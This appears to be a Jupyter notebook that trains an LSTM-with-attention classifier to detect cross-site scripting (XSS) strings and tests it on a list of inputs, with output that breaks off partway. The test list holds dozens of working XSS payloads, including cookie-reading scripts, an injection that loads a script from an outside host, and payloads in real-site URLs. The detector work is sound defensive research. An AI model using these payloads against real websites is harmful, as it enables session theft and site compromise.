In [1]:
import pandas as pd
import numpy as np
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import Model
from tensorflow.keras.layers import Embedding, LSTM, Dense, Input, Bidirectional, GlobalMaxPool1D, Dot, Activation, Concatenate
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder

# Load dataset
data = pd.read_csv('datasetClean.csv')

# Preprocessing
tokenizer = Tokenizer()
tokenizer.fit_on_texts(data['Sentence'])
sequences = tokenizer.texts_to_sequences(data['Sentence'])
max_len = max([len(x) for x in sequences])
X = pad_sequences(sequences, maxlen=max_len)

# X = ["halo", "tes", "<script>"]
# y = [0, 0, 1]

# Encode labels
label_encoder = LabelEncoder()
y = label_encoder.fit_transform(data['Type'])

# Split the data into 80% training+validation and 20% testing
X_train_val, X_test, y_train_val, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

# Split the 80% training+validation set into 60% training and 20% validation
# X_train_val+y_train_val itu 80% maka jika diambil 25%, 25%*80% jadinya 20%
X_train, X_val, y_train, y_val = train_test_split(X_train_val, y_train_val, test_size=0.25, random_state=42)  # 0.25 * 0.8 = 0.2

# Building the Model
vocab_size = len(tokenizer.word_index) + 1
embedding_dim = 100

# Input layer
input_layer = Input(shape=(max_len,))
# Embedding layer
embedding_layer = Embedding(vocab_size, embedding_dim, input_length=max_len)(input_layer)
# Bidirectional LSTM layer
lstm_layer = Bidirectional(LSTM(64, return_sequences=True))(embedding_layer)

# Attention mechanism
attention = Dot(axes=[2, 2])([lstm_layer, lstm_layer])
attention = Activation('softmax')(attention)
context = Dot(axes=[2, 1])([attention, lstm_layer])
context = Concatenate()([context, lstm_layer])

# Global Max Pooling
x = GlobalMaxPool1D()(context)
# [[1,1],[1,2]]...
# [1,1,,1,2]
# Dense layers
x = Dense(64, activation='relu')(x)
output_layer = Dense(1, activation='sigmoid')(x)

# Create model
model = Model(inputs=input_layer, outputs=output_layer)

# Compile and Train the Model
model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])
model.fit(X_train, y_train, epochs=10, batch_size=32, validation_data=(X_val, y_val))

# Evaluate the Model
loss, accuracy = model.evaluate(X_test, y_test)
print(f'Accuracy: {accuracy*100:.2f}%')


c:\Users\mamat\ML-XSS-Detection-LSTM-Attention\venv\lib\site-packages\keras\src\layers\core\embedding.py:90: UserWarning: Argument `input_length` is deprecated. Just remove it.
  warnings.warn(


Epoch 1/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 364s 1s/step - accuracy: 0.9297 - loss: 0.1537 - val_accuracy: 0.9989 - val_loss: 0.0027
Epoch 2/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 354s 1s/step - accuracy: 1.0000 - loss: 6.8683e-04 - val_accuracy: 0.9994 - val_loss: 0.0025
Epoch 3/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 352s 1s/step - accuracy: 1.0000 - loss: 3.4843e-05 - val_accuracy: 0.9994 - val_loss: 0.0028
Epoch 4/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 383s 1s/step - accuracy: 1.0000 - loss: 1.3828e-05 - val_accuracy: 0.9992 - val_loss: 0.0032
Epoch 5/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 357s 1s/step - accuracy: 1.0000 - loss: 7.7874e-06 - val_accuracy: 0.9992 - val_loss: 0.0034
Epoch 6/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 357s 1s/step - accuracy: 1.0000 - loss: 4.7131e-06 - val_accuracy: 0.9992 - val_loss: 0.0036
Epoch 7/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 357s 1s/step - accuracy: 1.0000 - loss: 3.2080e-06 - val_accuracy: 0.9989 - val_loss: 0.0038
Epoch 8/10
339/339 ━━━━━━━━━━━━━━━━━━━━ 382s 1s/step - accuracy: 1.0000 -

In [ ]:
import pickle

with open("label_encoder.pkl", "wb") as f:
    pickle.dump(label_encoder, f)

with open("tokenizer.pkl", "wb") as f:
    pickle.dump(tokenizer, f)

In [2]:
model.save('LSTMAttentionXSS.keras')

In [3]:
!mkdir -p saved_model
model.export('saved_model/LSTMAttentionXSS')

INFO:tensorflow:Assets written to: saved_model/LSTMAttentionXSS\assets


INFO:tensorflow:Assets written to: saved_model/LSTMAttentionXSS\assets


Saved artifact at 'saved_model/LSTMAttentionXSS'. The following endpoints are available:

* Endpoint 'serve'
  args_0 (POSITIONAL_ONLY): TensorSpec(shape=(None, 800), dtype=tf.float32, name='keras_tensor')
Output Type:
  TensorSpec(shape=(None, 1), dtype=tf.float32, name=None)
Captures:
  2341110867296: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119233712: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119233888: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119230368: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119233360: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119238464: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119238112: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119243920: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119244448: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119346288: TensorSpec(shape=(), dtype=tf.resource, name=None)
  2341119348752: TensorSpec(shap

In [4]:
model.save('LSTMAttentionXSS.h5')

In [6]:
from tensorflow.keras.models import load_model

model = load_model("LSTMAttentionXSS.h5")

In [7]:
testXSS = [
                '<script>alert(\'xss\')</script><script><script>',
                'hellomo',
                'https://store.bentley.com/en/shop/search?term=%22%3E%3Cdetails%20open%20ontoggle=prompt(1337)%3ExxLouisLouisLouis',
                'ghfdhgdhjgd',
                'uid%3D19%26list_page%3D%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C/script%3E',
                '&template=en_search_error&postalCode=\\\';alert(0)//',
                '&where=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&loctypes=1003%2C1001%2C1000%2C1%2C9%2C5%2C11%2C13%2C19%2C20&from=hdr_localsearch',
                'http://mydata.com/sad/sd/qwd/qwde/qwe/?sessionid=12',
                'http://mydata.com?id=script',
                '&\';}},{scope:\'email,user_about_me,user_hometown,user_interests,user_likes,user_status,user_website,user_birthday,publish_stream,publish_actions,offline_access\'});}alert(0);b=function(response){c=({a:{//',
                'http://myurl.com?<script',
                'http://mydata.com?script=script',
                'composite_search=1&keyword="/><script>alert("Xss:Vijayendra")</script>',
                'http://mysite.com?srtalert',
                'script',
                'alert',
                'Search=%22%3E\'%3E%3CSCRIPT%20SRC=http://br.zone-h.org/testes/xss.js%3E%3C/SCRIPT%3E?',
                'id=15%3Cscript%3Ealert%28document.cookie%29%3C/script%3E',
                'composite_search=1&keyword="/><script>alert("Xss:Vijayendra")</script>',
                'id=123&href=abdc<a<script>alert(1)',
                '<<<<<<>>>>></>,><><>',
                'alert()alert()',
                'alertalert',
                '?url=http://localhost:8888/notebooks/Documents/MachineLearning/Practical%20Machine%20Learning',
                '<script<script',
                '<scriptalert',
                'httphttphttp',
                'https://disqus.com/?ref_noscript',
                'I am a string',
                '<img src="javascript:alert(1)/>"',
                'HelloWorld!',
                'http://mysite.com?<script>',
                '<input type="text" value=`` <div/onmouseover=\'alert(471)\'>X</div>',
                '<img \x47src=x onerror="javascript:alert(324)">',
                '<a href="\xE2\x80\x87javascript:javascript:alert(183)" id="fuzzelement1">test</a>',
                '<body onscroll=javascript:alert(288)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
                '<meta charset="mac-farsi">¼script¾javascript:alert(379)¼/script¾',
                '<HTML xmlns:xss><?import namespace=(493)s" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID=(494)s"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(420)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
            ]

In [10]:
# === PREPROCESS (LSTM PIPELINE ONLY) ===
new_sequences = tokenizer.texts_to_sequences(testXSS)
new_X = pad_sequences(new_sequences, maxlen=max_len)

# === PREDICT ===
probs = model.predict(new_X)

# convert to 1D
probs = probs.flatten()

# threshold
predicted_labels = (probs > 0.5).astype(int)

# decode labels (ONLY if label_encoder was used during training)
try:
    predicted_class_labels = label_encoder.inverse_transform(predicted_labels)
except:
    predicted_class_labels = predicted_labels

# === PRINT RESULTS ===
for sentence, prob, label in zip(testXSS, probs, predicted_class_labels):
    print(f"Sentence: {sentence}")
    print(f"Probability: {prob:.4f}")
    print(f"Predicted label: {label}")
    print()

# === SUMMARY ===
xssCount = np.sum(predicted_labels == 1)
notXssCount = np.sum(predicted_labels == 0)

print()
print("*------------- RESULTS LSTM+ATTENTION -------------*")
print(f"\033[1;31;1mXSS\033[0;0m => {xssCount}")
print(f"\033[1;32;1mNOT XSS\033[0;0m => {notXssCount}")

2/2 ━━━━━━━━━━━━━━━━━━━━ 0s 99ms/step
Sentence: <script>alert('xss')</script><script><script>
Probability: 1.0000
Predicted label: Malicious

Sentence: hellomo
Probability: 0.0017
Predicted label: Benign

Sentence: https://store.bentley.com/en/shop/search?term=%22%3E%3Cdetails%20open%20ontoggle=prompt(1337)%3ExxLouisLouisLouis
Probability: 1.0000
Predicted label: Malicious

Sentence: ghfdhgdhjgd
Probability: 0.0017
Predicted label: Benign

Sentence: uid%3D19%26list_page%3D%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C/script%3E
Probability: 1.0000
Predicted label: Malicious

Sentence: &template=en_search_error&postalCode=\';alert(0)//
Probability: 0.9996
Predicted label: Malicious

Sentence: &where=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&loctypes=1003%2C1001%2C1000%2C1%2C9%2C5%2C11%2C13%2C19%2C20&from=hdr_localsearch
Probability: 1.0000
Predicted label: Malicious

Sentence: http://mydata.com/sad/sd/qwd/qwde/qwe/?sessionid=12
Probability: 0.6147
Predicted label: Malicious

S